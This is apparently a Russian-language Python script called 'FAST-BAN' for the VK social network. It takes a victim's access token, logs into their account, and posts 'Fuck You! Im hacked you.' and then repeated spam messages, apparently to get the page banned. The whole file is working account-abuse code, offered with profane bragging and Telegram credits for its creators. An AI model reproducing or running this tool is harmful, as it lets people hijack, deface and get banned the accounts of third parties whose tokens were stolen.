import requests
import vk_api
import os
import time
from colorama import Fore, Back, Style 
def fastban():
    os.system("clear")
    intro = '''
\033[32m\033[01m
   _____ _    ____ _____    ____    _    _   _
  |  ___/ \  / ___|_   _|  | __ )  / \  | \ | |
  | |_ / _ \ \___ \ | |____|  _ \ / _ \ |  \| |
  |  _/ ___ \ ___) || |____| |_) / ___ \| |\  |
  |_|/_/   \_\____/ |_|    |____/_/   \_\_| \_|
\033[0m
      .:Модернизировано Drag228228:. .:|ТВОИМ ДРУЗЬЯМ ПИЗДА!!!|:.

'''
    print(Fore.RED + "\033[1m" + intro)
    print(Fore.WHITE + """                                  
[1] Бан с помощью поста                        
[2] Создатели (оригинальные)                          
[3] Выход                                


    """)
    a = input("[Номер] -> ")
    if a == "1":
        try:
            tok = input("[Токер дауна] -> ") 
            token = vk_api.VkApi(token = tok) 
            vk = token.get_api()
            vk.wall.post(message='Fuck You! Im hacked you.')
            for var in range(5):
                time.sleep(3)
                vk.wall.post(message='Сова никогда не спит')             
                print(Fore.BLACK + Back.RED + "[log] Сообщение отправленно. Ожидайте пиздеца!")
            print(Back.BLACK + Fore.WHITE)
            os.system("clear")
            fastban()
        except Exception as er:
            print('Невалидный токен или страница в бане')
            fastban()
    if a == "2":
        print("""                                  
 Создатели                               
 TELEGRAM: @cod1ng_lab                    
 TELEGRAM: @BatyaRimskiy1                  
 Для выхода в главное меню нажмите Enter   

        """)
        c = input("-> : ")
        if c == "1":
            os.system("clear")
            fastban()
        else:
            os.system("clear")
            fastban()
    if a == "3":
        os.system("exit")
    else:
        fastban()
fastban()
